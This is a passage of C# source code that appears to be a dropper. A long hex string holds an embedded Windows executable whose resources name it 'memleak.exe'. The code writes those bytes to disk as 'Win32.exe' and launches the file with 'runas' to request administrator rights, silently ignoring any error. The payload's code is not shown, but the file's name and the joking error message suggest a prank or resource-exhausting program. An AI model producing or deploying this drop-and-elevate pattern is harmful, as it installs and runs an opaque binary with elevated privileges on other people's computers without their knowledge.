00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 00 10 00 00 00 20 00 00 80 18 00 00 00 50 00 00 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 01 00 00 00 38 00 00 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 01 00 00 00 68 00 00 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 A4 03 00 00 90 40 00 00 14 03 00 00 00 00 00 00 00 00 00 00 14 03 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00 4F 00 4E 00 5F 00 49 00 4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00 00 01 00 00 00 01 00 00 00 00 00 00 00 01 00 00 00 00 00 3F 00 00 00 00 00 00 00 04 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 44 00 00 00 01 00 56 00 61 00 72 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 00 00 24 00 04 00 00 00 54 00 72 00 61 00 6E 00 73 00 6C 00 61 00 74 00 69 00 6F 00 6E 00 00 00 00 00 00 00 B0 04 74 02 00 00 01 00 53 00 74 00 72 00 69 00 6E 00 67 00 46 00 69 00 6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 50 02 00 00 01 00 30 00 30 00 30 00 30 00 30 00 34 00 62 00 30 00 00 00 1A 00 01 00 01 00 43 00 6F 00 6D 00 6D 00 65 00 6E 00 74 00 73 00 00 00 00 00 00 00 26 00 03 00 01 00 43 00 6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00 00 48 00 50 00 00 00 00 00 38 00 08 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00 69 00 70 00 74 00 69 00 6F 00 6E 00 00 00 00 00 6D 00 65 00 6D 00 6C 00 65 00 61 00 6B 00 00 00 30 00 08 00 01 00 46 00 69 00 6C 00 65 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 00 00 31 00 2E 00 30 00 2E 00 30 00 2E 00 30 00 00 00 38 00 0C 00 01 00 49 00 6E 00 74 00 65 00 72 00 6E 00 61 00 6C 00 4E 00 61 00 6D 00 65 00 00 00 6D 00 65 00 6D 00 6C 00 65 00 61 00 6B 00 2E 00 65 00 78 00 65 00 00 00 4C 00 14 00 01 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 43 00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 20 00 A9 00 20 00 48 00 50 00 20 00 32 00 30 00 32 00 35 00 00 00 2A 00 01 00 01 00 4C 00 65 00 67 00 61 00 6C 00 54 00 72 00 61 00 64 00 65 00 6D 00 61 00 72 00 6B 00 73 00 00 00 00 00 00 00 00 00 40 00 0C 00 01 00 4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 6D 00 65 00 6D 00 6C 00 65 00 61 00 6B 00 2E 00 65 00 78 00 65 00 00 00 30 00 08 00 01 00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 6D 00 65 00 6D 00 6C 00 65 00 61 00 6B 00 00 00 34 00 08 00 01 00 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 31 00 2E 00 30 00 2E 00 30 00 2E 00 30 00 00 00 38 00 08 00 01 00 41 00 73 00 73 00 65 00 6D 00 62 00 6C 00 79 00 20 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 31 00 2E 00 30 00 2E 00 30 00 2E 00 30 00 00 00 B4 43 00 00 EA 01 00 00 00 00 00 00 00 00 00 00 EF BB BF 3C 3F 78 6D 6C 20 76 65 72 73 69 6F 6E 3D 22 31 2E 30 22 20 65 6E 63 6F 64 69 6E 67 3D 22 55 54 46 2D 38 22 20 73 74 61 6E 64 61 6C 6F 6E 65 3D 22 79 65 73 22 3F 3E 0D 0A 0D 0A 3C 61 73 73 65 6D 62 6C 79 20 78 6D 6C 6E 73 3D 22 75 72 6E 3A 73 63 68 65 6D 61 73 2D 6D 69 63 72 6F 73 6F 66 74 2D 63 6F 6D 3A 61 73 6D 2E 76 31 22 20 6D 61 6E 69 66 65 73 74 56 65 72 73 69 6F 6E 3D 22 31 2E 30 22 3E 0D 0A 20 20 3C 61 73 73 65 6D 62 6C 79 49 64 65 6E 74 69 74 79 20 76 65 72 73 69 6F 6E 3D 22 31 2E 30 2E 30 2E 30 22 20 6E 61 6D 65 3D 22 4D 79 41 70 70 6C 69 63 61 74 69 6F 6E 2E 61 70 70 22 2F 3E 0D 0A 20 20 3C 74 72 75 73 74 49 6E 66 6F 20 78 6D 6C 6E 73 3D 22 75 72 6E 3A 73 63 68 65 6D 61 73 2D 6D 69 63 72 6F 73 6F 66 74 2D 63 6F 6D 3A 61 73 6D 2E 76 32 22 3E 0D 0A 20 20 20 20 3C 73 65 63 75 72 69 74 79 3E 0D 0A 20 20 20 20 20 20 3C 72 65 71 75 65 73 74 65 64 50 72 69 76 69 6C 65 67 65 73 20 78 6D 6C 6E 73 3D 22 75 72 6E 3A 73 63 68 65 6D 61 73 2D 6D 69 63 72 6F 73 6F 66 74 2D 63 6F 6D 3A 61 73 6D 2E 76 33 22 3E 0D 0A 20 20 20 20 20 20 20 20 3C 72 65 71 75 65 73 74 65 64 45 78 65 63 75 74 69 6F 6E 4C 65 76 65 6C 20 6C 65 76 65 6C 3D 22 61 73 49 6E 76 6F 6B 65 72 22 20 75 69 41 63 63 65 73 73 3D 22 66 61 6C 73 65 22 2F 3E 0D 0A 20 20 20 20 20 20 3C 2F 72 65 71 75 65 73 74 65 64 50 72 69 76 69 6C 65 67 65 73 3E 0D 0A 20 20 20 20 3C 2F 73 65 63 75 72 69 74 79 3E 0D 0A 20 20 3C 2F 74 72 75 73 74 49 6E 66 6F 3E 0D 0A 3C 2F 61 73 73 65 6D 62 6C 79 3E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 30 00 00 0C 00 00 00 60 32 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00";

                hexstring = hexstring.Replace(" ", "");

                byte[] exebytes = new byte[hexstring.Length / 2];
                for (int i = 0; i < hexstring.Length; i += 2)
                {
                    exebytes[i / 2] = Convert.ToByte(hexstring.Substring(i, 2), 16);
                }

                string filepath = Path.Combine(Directory.GetCurrentDirectory(), "Win32.exe");
                File.WriteAllBytes(filepath, exebytes);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"I dont want to run. Im tired. {ex.Message}");
            }
        }

        static void runadmin()
        {
            string winpath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Win32.exe");
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = winpath,
                Verb = "runas",
                UseShellExecute = true
            };

            try
            {
                Process.Start(psi);
            }
            catch
            {
               
            }
        }
    }
}